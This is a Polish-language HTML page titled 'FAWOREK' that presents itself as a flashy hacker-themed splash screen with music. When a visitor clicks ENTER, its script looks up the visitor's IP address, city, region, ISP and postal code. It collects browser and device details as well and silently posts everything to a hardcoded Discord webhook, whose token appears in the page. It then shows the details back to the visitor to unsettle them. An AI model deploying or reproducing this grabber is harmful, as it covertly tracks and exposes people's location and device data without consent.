<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>FAWOREK</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    :root { --hacker-green: #00b33c; }
    html, body { height:100%; margin:0; padding:0; }
    body {
      background:#000;
      color:var(--hacker-green);
      font-family:'Inter', Arial, Helvetica, sans-serif;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:flex-start;
      text-align:center;
      overflow-y:auto;
      padding-bottom:50px;
    }
    #title {
      font-size:140px;
      margin:120px 0 20px;
      color:var(--hacker-green);
      text-shadow:0 0 10px rgba(0,179,60,0.2);
      animation:pulse 2s infinite;
      user-select:none;
    }
    #enterBtn {
      padding:24px 50px;
      font-size:32px;
      border-radius:14px;
      border:2px solid var(--hacker-green);
      background:transparent;
      color:var(--hacker-green);
      cursor:pointer;
      transition: transform 0.15s, box-shadow 0.15s;
      margin-bottom:40px;
    }
    #enterBtn:hover {
      transform:scale(1.07);
      box-shadow:0 0 20px rgba(0,179,60,0.25);
    }
    #info {
      margin-top:40px;
      width:100%;
      max-width:1400px;
      display:none;
      padding:0 20px;
      box-sizing:border-box;
    }
    .line {
      font-size:84px;
      line-height:1.1;
      margin:22px 0;
      opacity:0;
      transform:translateY(-240px);
      transition: transform 1s cubic-bezier(.22,.9,.3,1), opacity 0.3s ease-in;
      white-space:nowrap;
      overflow:hidden;
      text-overflow:ellipsis;
      color:var(--hacker-green);
      text-shadow:0 0 8px rgba(0,179,60,0.15);
    }
    .line.show {
      opacity:1;
      transform:translateY(0);
    }
    @keyframes pulse {
      0%,100% { transform:scale(1); }
      50% { transform:scale(1.05); }
    }
    @media (max-width:900px){
      #title { font-size:72px; margin-top:80px; }
      #enterBtn { font-size:24px; padding:16px 32px; }
      .line { font-size:42px; }
    }
  </style>
</head>
<body>
  <div id="topWrap" style="width:100%; display:flex; flex-direction:column; align-items:center;">
    <div id="title">FAWOREK</div>
    <button id="enterBtn">ENTER</button>
  </div>
  <div id="info"></div>

  <!-- Muzyka -->
  <audio id="bgMusic" loop>
    <source src="muzyka.mp3" type="audio/mpeg">
    Twoja przeglądarka nie obsługuje audio.
  </audio>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1420042351400714411/yEVRIReZTWgcisWkmtWX16JlnKjrKbcqQidiWNaQkvgJYDG_Udbltj0vXTqmMa2w-NBu";

    const enterBtn = document.getElementById('enterBtn');
    const title = document.getElementById('title');
    const infoDiv = document.getElementById('info');
    const music = document.getElementById('bgMusic');

    const wait = ms => new Promise(res => setTimeout(res, ms));

    const smoothScrollTo = (targetY, duration = 900) => {
      const startY = window.scrollY || window.pageYOffset;
      const distance = targetY - startY;
      const startTime = performance.now();
      return new Promise(resolve => {
        const step = now => {
          const elapsed = now - startTime;
          const t = Math.min(1, elapsed / duration);
          const ease = t < 0.5 ? 2*t*t : -1 + (4 - 2*t)*t;
          window.scrollTo(0, Math.round(startY + distance * ease));
          t < 1 ? requestAnimationFrame(step) : resolve();
        };
        requestAnimationFrame(step);
      });
    };

    enterBtn.addEventListener('click', async () => {
      title.style.display='none';
      enterBtn.style.display='none';
      infoDiv.style.display='block';

      // Odpalenie muzyki
      music.volume = 1.0;
      music.play().catch(e=>console.warn("Audio error:", e));

      const browser = navigator.userAgent;
      const platform = navigator.platform;
      const lang = navigator.language;

      let data = {};
      try {
        const resp = await fetch('https://ipapi.co/json/');
        data = await resp.json();
      } catch(e){ console.error("IP fetch error:", e); }

      const infoLines = [
        `IP: ${data.ip||'brak'}`,
        `Kraj: ${data.country_name||'brak'}`,
        `Miasto: ${data.city||'brak'}`,
        `Region: ${data.region||'brak'}`,
        `Dostawca: ${data.org||'brak'}`,
        `Kod pocztowy: ${data.postal||'brak'}`,
        `Strefa czasowa: ${data.timezone||'brak'}`,
        `Przeglądarka: ${browser}`,
        `System: ${platform}`,
        `Język przeglądarki: ${lang}`,
        `User Agent: ${navigator.userAgent}`,
        `Cookies włączone: ${navigator.cookieEnabled}`,
        `JavaScript włączony: ${typeof navigator.javaEnabled==='function'?navigator.javaEnabled():'brak'}`,
        `Screen: ${window.screen.width}x${window.screen.height}`,
        `Kolor głębi: ${window.screen.colorDepth}bit`,
        `Pixel Ratio: ${window.devicePixelRatio}`,
        `Platforma CPU: ${navigator.hardwareConcurrency||'brak'}`,
        `Online: ${navigator.onLine}`,
        `Referrer: ${document.referrer||'brak'}`,
        `URL: ${location.href}`,
        `Hostname: ${window.location.hostname}`,
        `Origin: ${window.location.origin}`,
        `Do Not Track: ${navigator.doNotTrack||'brak'}`,
        `Connection: ${navigator.connection?navigator.connection.effectiveType:'brak'}`
      ];

      // Wyślij dane do Discord
      if(WEBHOOK_URL.trim().length>10){
        const payload = { content: `FAWOREK — nowy visitor\n${infoLines.join('\n')}` };
        fetch(WEBHOOK_URL, {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify(payload)
        }).catch(e=>console.error("Webhook send error:", e));
      }

      // Wyświetl linia po linii
      for(let i=0;i<infoLines.length;i++){
        const p=document.createElement('p');
        p.className='line';
        p.textContent = infoLines[i];
        infoDiv.appendChild(p);
        await wait(i===0?80:700);
        p.classList.add('show');
        smoothScrollTo(document.body.scrollHeight,800);
      }
    });
  </script>
</body>
</html>
